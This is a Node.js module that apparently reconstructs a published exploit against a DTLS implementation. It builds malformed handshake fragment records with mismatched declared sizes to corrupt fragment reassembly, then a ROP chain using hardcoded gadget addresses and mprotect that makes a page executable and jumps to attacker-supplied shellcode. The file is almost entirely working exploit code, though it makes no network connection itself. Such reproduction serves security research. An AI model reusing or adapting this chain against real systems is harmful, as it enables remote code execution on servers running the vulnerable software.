'use strict';
// Offline reconstruction of the published fragment and executable-page chain.
// Addresses belong to the article's analyzed build; this makes no connection.
const logicalSize = 96;
const primarySize = logicalSize;
const payloadSize = 1399 - 24 - primarySize;
const declaredSize = payloadSize + logicalSize - 1;
const POP_RDI_RET = 0x4e705dn;
const POP_RSI_RET = 0x44711en;
const POP_RDX_RET = 0x4590d2n;
const MPROTECT = 0x2006480n;
const ROP_STACK = 0x355e000n;
const SHELLCODE_ADDRESS = 0x355e100n;

function u24(value) {
    const b = Buffer.alloc(3);
    b.writeUIntBE(value, 0, 3);
    return b;
}
function header(type, total, seq, offset, size) {
    const sequence = Buffer.alloc(2);
    sequence.writeUInt16BE(seq);
    return Buffer.concat([Buffer.from([type]), u24(total), sequence,
                          u24(offset), u24(size)]);
}
function build(shellcode) {
    const chain = [ROP_STACK, POP_RSI_RET, 0x1000,
                   POP_RDX_RET, 7, MPROTECT, SHELLCODE_ADDRESS];
    const rop = Buffer.alloc(chain.length * 8);
    chain.forEach((v, i) => rop.writeBigUInt64LE(BigInt(v), i * 8));
    const records = [];
    for (let index = 0; index < logicalSize; index++) {
        const body = Buffer.concat([
            header(0x10, logicalSize, 2, index, 1),
            Buffer.alloc(primarySize),
            header(0x10, declaredSize, 3, 0, declaredSize),
            Buffer.alloc(payloadSize, 0xff)
        ]);
        const wire = Buffer.alloc(13);
        Buffer.from([0x16, 0xfe, 0xff, 0, 0]).copy(wire);
        wire.writeUIntBE(index + 2, 5, 6);
        wire.writeUInt16BE(body.length, 11);
        records.push(Buffer.concat([wire, body]));
    }
    return {records, rop, shellcode, entry: POP_RDI_RET};
}
module.exports = {build};
